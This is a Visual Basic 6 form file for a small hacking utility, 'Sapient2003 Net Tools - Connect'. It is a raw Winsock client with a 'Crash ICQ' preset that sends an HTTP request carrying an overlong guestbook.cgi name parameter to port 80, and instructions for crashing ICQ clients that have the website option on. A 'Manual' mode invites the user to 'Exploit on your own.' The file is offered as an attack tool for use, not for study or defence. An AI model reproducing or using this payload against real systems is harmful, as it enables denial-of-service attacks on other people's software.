VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form Connect 
   Caption         =   "Sapient2003 Net Tools - Connect"
   ClientHeight    =   4500
   ClientLeft      =   60
   ClientTop       =   345
   ClientWidth     =   6735
   Icon            =   "Connect.frx":0000
   LinkTopic       =   "Form1"
   LockControls    =   -1  'True
   Picture         =   "Connect.frx":0442
   ScaleHeight     =   300
   ScaleMode       =   3  'Pixel
   ScaleWidth      =   449
   StartUpPosition =   2  'CenterScreen
   Begin VB.TextBox Text5 
      BackColor       =   &H80000007&
      BorderStyle     =   0  'None
      ForeColor       =   &H80000009&
      Height          =   195
      Left            =   240
      TabIndex        =   22
      Text            =   "twice."
      Top             =   3360
      Width           =   495
   End
   Begin VB.TextBox Text4 
      BackColor       =   &H80000007&
      BorderStyle     =   0  'None
      ForeColor       =   &H80000009&
      Height          =   195
      Left            =   240
      TabIndex        =   21
      Text            =   "connect"
      Top             =   3120
      Width           =   615
   End
   Begin VB.TextBox Text3 
      BackColor       =   &H80000008&
      BorderStyle     =   0  'None
      ForeColor       =   &H80000009&
      Height          =   195
      Left            =   240
      TabIndex        =   20
      Text            =   "click"
      Top             =   2880
      Width           =   375
   End
   Begin VB.TextBox Text2 
      Alignment       =   2  'Center
      BackColor       =   &H80000007&
      BorderStyle     =   0  'None
      ForeColor       =   &H80000009&
      Height          =   195
      Left            =   240
      TabIndex        =   19
      Text            =   "you must "
      Top             =   2640
      Width           =   735
   End
   Begin VB.TextBox Text1 
      BackColor       =   &H80000007&
      BorderStyle     =   0  'None
      ForeColor       =   &H80000009&
      Height          =   195
      Left            =   240
      TabIndex        =   18
      Text            =   "To connect"
      Top             =   2400
      Width           =   855
   End
   Begin VB.TextBox note 
      BackColor       =   &H80000008&
      BorderStyle     =   0  'None
      ForeColor       =   &H80000009&
      Height          =   195
      Left            =   240
      TabIndex        =   17
      Text            =   "Note:"
      Top             =   2220
      Width           =   495
   End
   Begin VB.TextBox info2 
      Alignment       =   2  'Center
      BackColor       =   &H80000007&
      BorderStyle     =   0  'None
      ForeColor       =   &H80000009&
      Height          =   195
      Left            =   360
      TabIndex        =   16
      Top             =   3840
      Width           =   6015
   End
   Begin VB.TextBox info 
      Alignment       =   2  'Center
      BackColor       =   &H80000007&
      BorderStyle     =   0  'None
      ForeColor       =   &H8000000E&
      Height          =   195
      Left            =   360
      TabIndex        =   15
      Text            =   "Exploit on your own."
      Top             =   3600
      Width           =   6015
   End
   Begin VB.Frame Frame2 
      BackColor       =   &H80000012&
      BorderStyle     =   0  'None
      Height          =   1575
      Left            =   960
      TabIndex        =   10
      Top             =   2040
      Width           =   5055
      Begin VB.TextBox CodeWin 
         Height          =   1335
         Left            =   120
         Locked          =   -1  'True
         MultiLine       =   -1  'True
         ScrollBars      =   3  'Both
         TabIndex        =   11
         TabStop         =   0   'False
         Top             =   240
         Width           =   4815
      End
      Begin VB.Label Label4 
         BackColor       =   &H80000012&
         Caption         =   "Data Recieved:"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H8000000E&
         Height          =   255
         Left            =   120
         TabIndex        =   12
         Top             =   0
         Width           =   1455
      End
   End
   Begin VB.Frame Frame1 
      BackColor       =   &H80000012&
      BorderStyle     =   0  'None
      Height          =   1815
      Left            =   960
      TabIndex        =   6
      Top             =   840
      Width           =   5295
      Begin VB.OptionButton opt2 
         BackColor       =   &H80000008&
         Caption         =   "Manual"
         ForeColor       =   &H8000000E&
         Height          =   195
         Left            =   120
         TabIndex        =   14
         Top             =   480
         Width           =   855
      End
      Begin VB.OptionButton opt1 
         BackColor       =   &H80000008&
         Caption         =   "Crash ICQ"
         ForeColor       =   &H8000000E&
         Height          =   195
         Left            =   1080
         TabIndex        =   13
         Top             =   480
         Width           =   1095
      End
      Begin VB.CommandButton Close 
         Caption         =   "Close"
         Height          =   255
         Left            =   4440
         TabIndex        =   5
         Top             =   960
         Width           =   855
      End
      Begin VB.CommandButton Connect 
         Caption         =   "Connect"
         Height          =   255
         Left            =   4440
         TabIndex        =   2
         Top             =   240
         Width           =   855
      End
      Begin VB.CommandButton Send 
         Caption         =   "Send"
         Default         =   -1  'True
         Enabled         =   0   'False
         Height          =   255
         Left            =   4440
         TabIndex        =   4
         Top             =   600
         Width           =   855
      End
      Begin VB.TextBox Data 
         Height          =   285
         Left            =   1440
         TabIndex        =   3
         Top             =   840
         Width           =   2415
      End
      Begin VB.TextBox Port 
         Height          =   285
         Left            =   3480
         MaxLength       =   5
         TabIndex        =   1
         Text            =   "00000"
         Top             =   120
         Width           =   615
      End
      Begin VB.TextBox Host 
         Height          =   285
         Left            =   1320
         TabIndex        =   0
         Top             =   120
         Width           =   1455
      End
      Begin VB.Label Label3 
         BackColor       =   &H80000012&
         Caption         =   "Data to send:"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H8000000E&
         Height          =   255
         Left            =   120
         TabIndex        =   9
         Top             =   840
         Width           =   1215
      End
      Begin VB.Label Label2 
         BackColor       =   &H80000012&
         Caption         =   "Hostname:"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H8000000E&
         Height          =   255
         Left            =   120
         TabIndex        =   8
         Top             =   120
         Width           =   975
      End
      Begin VB.Label Label1 
         BackColor       =   &H80000012&
         Caption         =   "Port:"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H8000000E&
         Height          =   255
         Left            =   3000
         TabIndex        =   7
         Top             =   120
         Width           =   495
      End
   End
   Begin MSWinsockLib.Winsock Winsock1 
      Left            =   3000
      Top             =   2280
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
End
Attribute VB_Name = "Connect"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Close_Click()
Unload Me
End Sub

Private Sub Connect_Click()
On Error Resume Next
Winsock1.LocalPort = "65534"
Call Winsock1.Connect(Host.Text, Port.Text)
If Winsock1.State = 7 Then
Me.Caption = Me.Caption & " [" & Host.Text & "]"
Send.Enabled = True
End If
End Sub

Private Sub opt1_Click()
Me.Port.Text = "80"
Me.Data.Text = "GET / guestbook.cgi?name=01234567890012345678901234567890"
Me.info.Text = "This will only crash ICQ clients of which have the website option on. For this to work"
Me.info2.Text = "successful, you will need to send the first code and then two blank (enters)."
End Sub

Private Sub opt2_Click()
Me.Port.Text = ""
Me.Data.Text = ""
Me.info.Text = "Exploit on your own."
Me.info2.Text = ""
End Sub

Private Sub Form_Resize()
If Me.WindowState = vbNormal Then
Me.Height = 4905
Me.Width = 6855
ElseIf Me.WindowState = vbMaximized Then Me.WindowState = vbNormal
End If
End Sub

Private Sub Form_Terminate()
Winsock1.Close
End Sub

Private Sub Form_Unload(Cancel As Integer)
Winsock1.Close
End Sub

Private Sub Send_Click()
Winsock1.SendData Data.Text
CodeWin.Text = CodeWin.Text & Data.Text & vbCrLf
Data.Text = ""
End Sub

Private Sub Winsock1_ConnectionRequest(ByVal requestID As Long)
Winsock1.Accept requestID
End Sub

Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)
Dim NewData As String

Winsock1.GetData (NewData)

CodeWin.Text = CodeWin.Text & NewData & vbCrLf

End Sub
